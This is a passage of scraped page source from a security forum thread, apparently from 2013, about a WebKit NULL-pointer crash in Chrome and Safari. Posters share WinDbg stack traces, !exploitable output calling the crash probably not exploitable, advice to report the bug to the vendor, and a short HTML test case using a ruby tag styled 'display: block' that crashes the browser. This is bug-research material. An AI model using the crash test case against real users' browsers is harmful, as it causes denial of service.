[c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\loader\\frameloader.cpp @ 837]\r\n006aeeb0 52e06512 chrome_52c70000!WebCore::FrameLoader::checkCompleted+0x186 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\loader\\frameloader.cpp @ 782]\r\n006aeeb8 52e04376 chrome_52c70000!WebCore::FrameLoader::finishedParsing+0x3d [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\loader\\frameloader.cpp @ 715]\r\n006aef14 52e0400f chrome_52c70000!WebCore::Document::finishedParsing+0xe6 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\dom\\document.cpp @ 4496]\r\n006aef20 52dbfbbd chrome_52c70000!WebCore::HTMLDocumentParser::attemptToRunDeferredScriptsAndEnd+0x10 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\html\\parser\\htmldocumentparser.cpp @ 764]\r\n006aef38 52dbf3b0 chrome_52c70000!WebCore::HTMLDocumentParser::prepareToStopParsing+0x110 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\html\\parser\\htmldocumentparser.cpp @ 211]\r\n006aef54 52dbe095 chrome_52c70000!WebCore::HTMLDocumentParser::finish+0x19a [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\html\\parser\\htmldocumentparser.cpp @ 828]\r\n006aef60 52d9ecaa chrome_52c70000!WebCore::DocumentWriter::end+0x4a [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\loader\\documentwriter.cpp @ 249]\r\n006aef70 52fd39c3 chrome_52c70000!WebCore::DocumentLoader::finishedLoading+0x128 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\loader\\documentloader.cpp @ 403]\r\n006aefcc 52fd38ee chrome_52c70000!WebCore::DocumentLoader::notifyFinished+0x3f [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\loader\\documentloader.cpp @ 354]\r\n006aeff8 52e89268 chrome_52c70000!WebCore::CachedResource::checkNotify+0x3a [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\loader\\cache\\cachedresource.cpp @ 379]\r\n006af030 52fd3792 chrome_52c70000!WebCore::CachedRawResource::data+0x15a [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\loader\\cache\\cachedrawresource.cpp @ 72]\r\n006af098 52fd3681 chrome_52c70000!WebCore::SubresourceLoader::didFinishLoading+0x97 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\loader\\subresourceloader.cpp @ 291]\r\n006af0a8 52fd35f4 chrome_52c70000!WebCore::ResourceLoader::didFinishLoading+0x13 [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\loader\\resourceloader.cpp @ 501]\r\n006af0bc 52fd3532 chrome_52c70000!WebCore::ResourceHandleInternal::didFinishLoading+0x3d [c:\\b\\build\\slave\\win\\build\\src\\third_party\\webkit\\source\\webcore\\platform\\network\\chromium\\resourcehandle.cpp @ 166]\r\n006af18c 52fd2e41 chrome_52c70000!webkit_glue::WebURLLoaderImpl::Context::OnCompletedRequest+0x147 [c:\\b\\build\\slave\\win\\build\\src\\webkit\\glue\\weburlloader_impl.cc @ 721]\r\n006af1c0 52fd2d35 chrome_52c70000!content::ResourceDispatcher::OnRequestComplete+0x94 [c:\\b\\build\\slave\\win\\build\\src\\content\\common\\resource_dispatcher.cc @ 502]\r\n006af1dc 52fd2a7d chrome_52c70000!DispatchToMethod&lt;content::ResourceDispatcher,void (__thiscall content::ResourceDispatcher::*)(int,int,bool,std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt; const &amp;,base::TimeTicks const &amp;),int,int,bool,std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;,base::TimeTicks&gt;+0x1e [c:\\b\\build\\slave\\win\\build\\src\\base\\tuple.h @ 572]\r\n006af234 52e7c1f6 chrome_52c70000!ResourceMsg_RequestComplete::Dispatch&lt;content::ResourceDispatcher,content::ResourceDispatcher,void (__thiscall content::ResourceDispatcher::*)(int,int,bool,std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt; const &amp;,base::TimeTicks const &amp;)&gt;+0x4c [c:\\b\\build\\slave\\win\\build\\src\\content\\common\\resource_messages.h @ 261]\r\n006af2dc 52d1d09a chrome_52c70000!content::ResourceDispatcher::DispatchMessageW+0x1ad [c:\\b\\build\\slave\\win\\build\\src\\content\\common\\resource_dispatcher.cc @ 601]\r\n006af300 52d1ce35 chrome_52c70000!content::ResourceDispatcher::OnMessageReceived+0xa6 [c:\\b\\build\\slave\\win\\build\\src\\content\\common\\resource_dispatcher.cc @ 293]\r\n006af36c 52ccc9fc chrome_52c70000!content::ChildThread::OnMessageReceived+0x1c [c:\\b\\build\\slave\\win\\build\\src\\content\\common\\child_thread.cc @ 241]\r\n006af39c 52cb0bdf chrome_52c70000!IPC::ChannelProxy::Context::OnDispatchMessage+0x93 [c:\\b\\build\\slave\\win\\build\\src\\ipc\\ipc_channel_proxy.cc @ 267]\r\n006af3ac 52ca4259 chrome_52c70000!base::internal::Invoker&lt;2,base::internal::BindState&lt;base::internal::RunnableAdapter&lt;void (__thiscall browser_sync::SyncBackendHost::Core::*)(std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt; const &amp;)&gt;,void __cdecl(browser_sync::SyncBackendHost::Core *,std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt; const &amp;),void __cdecl(browser_sync::SyncBackendHost::Core *,std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt;)&gt;,void __cdecl(browser_sync::SyncBackendHost::Core *,std::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt; &gt; const &amp;)&gt;::Run+0x16 [c:\\b\\build\\slave\\win\\build\\src\\base\\bind_internal.h @ 1257]\r\n006af440 52ca3c12 chrome_52c70000!MessageLoop::RunTask+0x341 [c:\\b\\build\\slave\\win\\build\\src\\base\\message_loop.cc @ 478]\r\n006af590 52ca5162 chrome_52c70000!MessageLoop::DoWork+0x2ec [c:\\b\\build\\slave\\win\\build\\src\\base\\message_loop.cc @ 672]\r\n006af5bc 52ca3818 chrome_52c70000!base::MessagePumpDefault::Run+0xc1 [c:\\b\\build\\slave\\win\\build\\src\\base\\message_pump_default.cc @ 30]</pre>\r\n</div>[snip] (because of post length restriction)\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_11862" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_11862" class="newreply" href="newreply.php?do=newreply&amp;p=11862" rel="nofollow" title="Reply With Quote"><img id="quoteimg_11862" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[11866] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_11866">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">06-07-2013,&nbsp;<span class="time">04:06 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post11866" href="showthread.php?t=4895&amp;p=11866&amp;viewfull=1#post11866" class="postcounter">#5</a><a id="postcount11866" name="5"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=16" title="41.w4r10r is offline"><strong>41.w4r10r</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=16" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=16&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=16" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=16" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/16-41-w4r10r" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="41.w4r10r is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Addict\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_11866_16" title="41.w4r10r has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=16" title="41.w4r10r is offline">\r\n				<img src="image.php?u=16&amp;dateline=1317119947" alt="41.w4r10r\'s Avatar" title="41.w4r10r\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>Pune</dd>\r\n					\r\n					<dt>Posts</dt> <dd>338</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=16">3</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_11866">\r\n						<blockquote class="postcontent restore ">\r\n							Reported same bug 1month back...\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_11866" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_11866" class="newreply" href="newreply.php?do=newreply&amp;p=11866" rel="nofollow" title="Reply With Quote"><img id="quoteimg_11866" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[12646] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_12646">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">12-19-2013,&nbsp;<span class="time">06:12 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post12646" href="showthread.php?t=4895&amp;p=12646&amp;viewfull=1#post12646" class="postcounter">#6</a><a id="postcount12646" name="6"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=6890" title="Lostmon is offline"><strong>Lostmon</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=6890" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=6890&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=6890" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=6890" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/6890-Lostmon" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="Lostmon is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Newcomer\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_12646_6890" title="Lostmon is on a distinguished road">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Dec 2013</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>1</dd>	\r\n					\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_12646">\r\n						<blockquote class="postcontent restore ">\r\n							In safari 5.1.7 it isn\'t exploitable <img src="images/smilies/smile.png" border="0" alt="" title="Smile" class="inlineimg" /><br />\r\n<br />\r\n<div class="bbcode_container">\r\n	<div class="bbcode_description">Code:</div>\r\n	<pre class="bbcode_code"style="height:372px;">Access violation - code c0000005 (!!! second chance !!!)\r\neax=00000000 ebx=7fb0498c ecx=7fb04a08 edx=69327140 esi=00000000 edi=7fb04a08\r\neip=69327172 esp=002dec8c ebp=7fb0498c iopl=0         nv up ei ng nz ac po cy\r\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010293\r\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\Safari\\Apple Application Support\\WebKit.dll - \r\nWebKit!WKOpenPanelResultListenerGetTypeID+0x643d2:\r\n69327172 8b460c          mov     eax,dword ptr [esi+0Ch] ds:0023:0000000c=????????\r\n0:000&gt; !load msec.dll\r\n0:000&gt; !exploitable -m\r\nVERSION:1.6.0.0\r\nIDENTITY:HostMachine\\HostUser\r\nPROCESSOR:X86\r\nCLASS:USER\r\nQUALIFIER:USER_PROCESS\r\nEVENT:DEBUG_EVENT_EXCEPTION\r\nEXCEPTION_FAULTING_ADDRESS:0xc\r\nEXCEPTION_CODE:0xC0000005\r\nEXCEPTION_LEVEL:SECOND_CHANCE\r\nEXCEPTION_TYPE:STATUS_ACCESS_VIOLATION\r\nEXCEPTION_SUBTYPE:READ\r\nFAULTING_INSTRUCTION:69327172 mov eax,dword ptr [esi+0ch]\r\nBASIC_BLOCK_INSTRUCTION_COUNT:3\r\nBASIC_BLOCK_INSTRUCTION:69327172 mov eax,dword ptr [esi+0ch]\r\nBASIC_BLOCK_INSTRUCTION_TAINTED_INPUT_OPERAND:esi\r\nBASIC_BLOCK_INSTRUCTION:69327175 cmp eax,edi\r\nBASIC_BLOCK_INSTRUCTION_TAINTED_INPUT_OPERAND:eax\r\nBASIC_BLOCK_INSTRUCTION:69327177 jne webkit!wkopenpanelresultlistenergettypeid+0x643d0 (69327170)\r\nBASIC_BLOCK_INSTRUCTION_TAINTED_INPUT_OPERAND:ZeroFlag\r\nMAJOR_HASH:0xf6e17282\r\nMINOR_HASH:0x044732ce\r\nSTACK_DEPTH:8\r\nSTACK_FRAME:WebKit!WKOpenPanelResultListenerGetTypeID+0x643d2\r\nSTACK_FRAME:WebKit!WKOpenPanelResultListenerGetTypeID+0x6479d\r\nSTACK_FRAME:WebKit!WKOpenPanelResultListenerGetTypeID+0x646f8\r\nSTACK_FRAME:WebKit!WKOpenPanelResultListenerGetTypeID+0xbc475\r\nSTACK_FRAME:WebKit!WKOpenPanelResultListenerGetTypeID+0xbbe81\r\nSTACK_FRAME:WebKit!WKOpenPanelResultListenerGetTypeID+0xac3dc\r\nSTACK_FRAME:WebKit!WKOpenPanelResultListenerGetTypeID+0xac428\r\nSTACK_FRAME:WebKit!WKOpenPanelResultListenerGetTypeID+0x67226\r\nINSTRUCTION_ADDRESS:0x0000000069327172\r\nINVOKING_STACK_FRAME:0\r\nDESCRIPTION:Read Access Violation near NULL\r\nSHORT_DESCRIPTION:ReadAVNearNull\r\nCLASSIFICATION:PROBABLY_NOT_EXPLOITABLE\r\nBUG_TITLE:Read Access Violation near NULL starting at WebKit!WKOpenPanelResultListenerGetTypeID+0x00000000000643d2 (Hash=0xf6e17282.0x044732ce)\r\nEXPLANATION:This is a user mode read access violation near null, and is probably not exploitable.</pre>\r\n</div>\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_12646" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_12646" class="newreply" href="newreply.php?do=newreply&amp;p=12646" rel="nofollow" title="Reply With Quote"><img id="quoteimg_12646" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+
+// next/previous post info
+pn[11858] = "12646,11859";
+pn[0] = ",11858";
+pn[11859] = "11858,11860";
+pn[11860] = "11859,11862";
+pn[11862] = "11860,11866";
+pn[11866] = "11862,12646";
+pn[12646] = "11866,11858";
+
+// cached usernames
+pu[0] = guestphrase;
+pu[61] = "&quot;vinnu&quot;";
+pu[8] = "fb1h2s";
+pu[424] = "webdevil";
+pu[16] = "41.w4r10r";
+pu[6890] = "Lostmon";
+
+// -->
+</script>
+
+
+<div id="threaded_view">
+	<h4>Threaded View</h4>
+
+	<div id="posttree">
+		<script type="text/javascript">
+		<!--
+			writeLink(11858, 0, 0, 61, "", "Safari 5.1.7 (7534.57.2) and...", "06-07-2013", "11:08 AM", 0, "showthreaddf36.html?t=4895&amp;p=11858#post11858");
+  writeLink(11859, 0, 0, 8, "T", "<i>I had some issues resolving...</i>", "06-07-2013", "01:34 PM", 0, "showthreadd840.html?t=4895&amp;p=11859#post11859");
+  writeLink(11860, 0, 0, 8, "L", "<i>0:000&gt; !analyze -v...</i>", "06-07-2013", "01:35 PM", 0, "showthreadd520.html?t=4895&amp;p=11860#post11860");
+    writeLink(11862, 0, 0, 424, "1,T", "<i>You kinda get alot of NULL...</i>", "06-07-2013", "02:44 PM", 0, "showthread819d.html?t=4895&amp;p=11862#post11862");
+    writeLink(11866, 0, 0, 16, "1,L", "<i>Reported same bug 1month...</i>", "06-07-2013", "04:06 PM", 0, "showthread7b56.html?t=4895&amp;p=11866#post11866");
+      writeLink(12646, 0, 0, 6890, "2,L", "<i>In safari 5.1.7 it isn't...</i>", "12-19-2013", "06:12 AM", 0, "showthread9ce4.html?t=4895&amp;p=12646#post12646");
+
+		//-->
+		</script>
+	</div>
+</div>
+	
+
+	
+		<ol id="posts" class="posts" start="1">
+			
+<li class="postbitlegacy postbitim postcontainer old" id="post_11859">
+<!-- see bottom of postbit.css for .userinfo .popupmenu styles -->
+
+	<div class="posthead">
+			<span class="postdate old">
+				
+					<span class="date">06-07-2013,&nbsp;<span class="time">01:34 PM</span></span>
+				
+			</span>
+			<span class="nodecontrols">
+				
+					<a name="post11859" href="showthread059a-2.html?t=4895&amp;p=11859&amp;viewfull=1#post11859" class="postcounter">#2</a><a id="postcount11859" name="2"></a>
+				
+				
+				
+			</span>
+	</div>
+	<div class="postdetails">
+		<div class="userinfo">
+			<div class="username_container">
+			
+				<div class="popupmenu memberaction">
+	<a class="username offline popupctrl" href="membere81f.html?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>
+	<ul class="popupbody popuphover memberaction_body">
+		<li class="left">
+			<a href="membere81f.html?u=8" class="siteicon_profile">
+				View Profile
+			</a>
+		</li>
+		
+		<li class="right">
+			<a href="search9898.html?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+				View Forum Posts
+			</a>
+		</li>
+		
+		
+		<li class="left">
+			<a href="privatedce0.html?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">
+				Private Message
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="bloge81f.html?u=8" class="siteicon_blog" rel="nofollow">
+				View Blog Entries
+			</a>
+		</li>
+		
+		
+		
+		<li class="left">
+			<a href="index.html" class="siteicon_homepage">
+				Visit Homepage
+			</a>
+		</li>
+		
+		
+		
+		<li class="right">
+			<a href="list2c25.html?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">
+				View Articles
+			</a>
+		</li>
+		
+
+		
+
+		
+		
+	</ul>
+</div>
+				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.html" alt="fb1h2s is offline" border="0" />
+
+			
+			</div>
+			<span class="usertitle">
+				Security Researcher
+			</span>
+			
+			
+			
+				<span class="postbit_reputation" id="repdisplay_11859_8" title="fb1h2s has a spectacular aura about">
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+						<img class="repimg" src="images/reputation/reputation_pos.html" alt="" />
+					
+				</span>
+			
+			
+			<a class="postuseravatar" href="membere81f.html?u=8" title="fb1h2s is offline">
+				<img src="20130721_18195935db.jpg?u=8&amp;dateline=1400680840" alt="fb1h2s's Avatar" title="fb1h2s's Avatar" />
+			</a>
+			 
+			
+				<hr />
+				<dl class="userinfo_extra">
+					<dt>Join Date</dt> <dd>Jul 2010</dd>
+					<dt>Location</dt> <dd>India</dd>
+					
+					<dt>Posts</dt> <dd>616</dd>	
+					<dt>Blog Entries</dt><dd><a href="bloge81f.html?u=8">32</a></dd>
+				</dl>
+				
+				
+				<div class="imlinks">
+					    
+				</div>
+			
+		</div>
+		<div class="postbody">
+			<div class="postrow has_after_content">
+				
+				
+
+
+						
+						
+				<div class="content">
+					<div id="post_message_11859">
+						<blockquote class="postcontent restore ">
+							I had some issues resolving chrome symbols, so cdnt do proper analysis.But I dont think there is a possibility of making it exploitable. You should report to vendor and wait a longer time :P before public disclosure <img src="images/smilies/biggrin.html" border="0" alt="" title="Big Grin" class="inlineimg" /> :P .  <br />
+<br />
+The villan is &quot; display: block;&quot; for ruby tag.<br />
+<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">PHP Code:</div>
+	<div class="bbcode_code"style="height:240px;"><code><code><span style="color: #000000">
+<span style="color: #0000BB"></span><span style="color: #007700">&lt;</span><span style="color: #0000BB">html</span><span style="color: #007700">&gt;<br />&lt;</span><span style="color: #0000BB">body</span><span style="color: #007700">&gt;<br /><br /><br />&lt;</span><span style="color: #0000BB">li</span><span style="color: #007700">&gt;<br /><br />&lt;</span><span style="color: #0000BB">ruby&nbsp;style</span><span style="color: #007700">=</span><span style="color: #DD0000">"display:&nbsp;block;"&nbsp;</span><span style="color: #007700">&gt;<br /><br /><br /><br />&lt;</span><span style="color: #0000BB">p&nbsp;</span><span style="color: #007700">&gt;</span><span style="color: #0000BB">I&nbsp;am&nbsp;fucked&nbsp;</span><span style="color: #007700">:|&nbsp;</span><span style="color: #0000BB">by&nbsp;style&nbsp;display&nbsp;</span><span style="color: #007700">:&nbsp;</span><span style="color: #0000BB">block</span><span style="color: #007700">&lt;/</span><span style="color: #0000BB">p</span><span style="color: #007700">&gt;<br /><br />&lt;/</span><span style="color: #0000BB">ruby</span><span style="color: #007700">&gt;<br />&lt;/</span><span style="color: #0000BB">li</span><span style="color: #007700">&gt;<br /><br /><br />&lt;/</span><span style="color: #0000BB">body</span><span style="color: #007700">&gt;<br />&lt;/</span><span style="color: #0000BB">html</span><span style="color: #007700">&gt;&nbsp;<br /></span><span style="color: #0000BB"></span>
+</span>
+</code></code></div>
+</div><br />
+0:008&gt; g<br />
+(f90.c14): Access violation - code c0000005 (first chance)<br />
+First chance exceptions are reported before any exception handling.<br />
+This exception may be expected and handled.<br />
+eax=00000000 ebx=02e9f4fc ecx=02e9f568 edx=632476aa esi=02e9f45c edi=02e9f568<br />
+eip=632476de esp=0024e778 ebp=0024e798 iopl=0         nv up ei ng nz ac po cy<br />
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010293<br />
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Google\Chrome\Application\27.0.1453.110\chro  me.dll - <br />
+chrome_630c0000!ovly_debug_event+0x1678c9:<br />
+632476de 8b400c          mov     eax,dword ptr [eax+0Ch] ds:0023:0000000c=????????<br />
+0:000&gt; u<br />
+chrome_630c0000!ovly_debug_event+0x1678c9:<br />
+632476de 8b400c          mov     eax,dword ptr [eax+0Ch]<br />
+632476e1 3bc7            cmp     eax,edi<br />
+632476e3 75f5            jne     chrome_630c0000!ovly_debug_event+0x1678c5 (632476da)<br />
+632476e5 8b742410        mov     esi,dword ptr [esp+10h]<br />
+632476e9 8b4618          mov     eax,dword ptr [esi+18h]<br />
+632476ec c1e807          shr     eax,7<br />
+632476ef a801            test    al,1<br />
+632476f1 0f84b5000000    je      chrome_630c0000!ovly_debug_event+0x167997 (632477ac)<br />
+0:000&gt; kb<br />
+ChildEBP RetAddr  Args to Child              <br />
+WARNING: Stack unwind information not available. Following frames may be wrong.<br />
+0024e798 63247683 02e9f400 02e9f4fc 02e9f4fc chrome_630c0000!ovly_debug_event+0x1678c9<br />
+0024e7b0 63253488 02e9f400 02e9f4fc 02e9f4fc chrome_630c0000!ovly_debug_event+0x16786e<br />
+0024e7c8 63bd8b79 02e9f400 02e9f4fc 02e9f45c chrome_630c0000!ovly_debug_event+0x173673<br />
+0024e7e4 63fa603f 02e9f400 02e9f4fc 02e9f384 chrome_630c0000!ovly_debug_event+0xaf8d64<br />
+0024e800 6358adb9 02e9f400 02e9f4fc 02e9f384 chrome_630c0000!ovly_debug_event+0xec622a<br />
+0024e828 6358ac14 00000000 63288d39 02e9f384 chrome_630c0000!ovly_debug_event+0x4aafa4<br />
+0024e87c 6328776c 02e9f318 00000000 0024e8a8 chrome_630c0000!ovly_debug_event+0x4aadff<br />
+0024e8c8 632848d8 00000001 0024e908 02e9f318 chrome_630c0000!ovly_debug_event+0x1a7957<br />
+0024e970 632842ac 00000001 00000000 02e9f318 chrome_630c0000!ovly_debug_event+0x1a4ac3<br />
+0024e990 63288d39 02e9f318 02e9f1d0 00000001 chrome_630c0000!ovly_debug_event+0x1a4497<br />
+0024e9dc 6328776c 02e9f1d0 00000000 0024ea08 chrome_630c0000!ovly_debug_event+0x1a8f24<br />
+0024ea28 632848d8 00000001 0024ea68 02e9f1d0 chrome_630c0000!ovly_debug_event+0x1a7957<br />
+0024ead0 632842ac 00000001 00000000 02e9f1d0 chrome_630c0000!ovly_debug_event+0x1a4ac3<br />
+0024eaf0 63288d39 02e9f1d0 02e9f010 00000001 chrome_630c0000!ovly_debug_event+0x1a4497<br />
+0024eb3c 6328776c 02e9f010 00000000 0024eb68 chrome_630c0000!ovly_debug_event+0x1a8f24<br />
+0024eb88 632848d8 00000001 0024ebc8 02e9f010 chrome_630c0000!ovly_debug_event+0x1a7957<br />
+0024ec30 632842ac 00000001 00000000 02e9f010 chrome_630c0000!ovly_debug_event+0x1a4ac3<br />
+0024ec50 63283d8d 02e9f010 00000000 01d24680 chrome_630c0000!ovly_debug_event+0x1a4497<br />
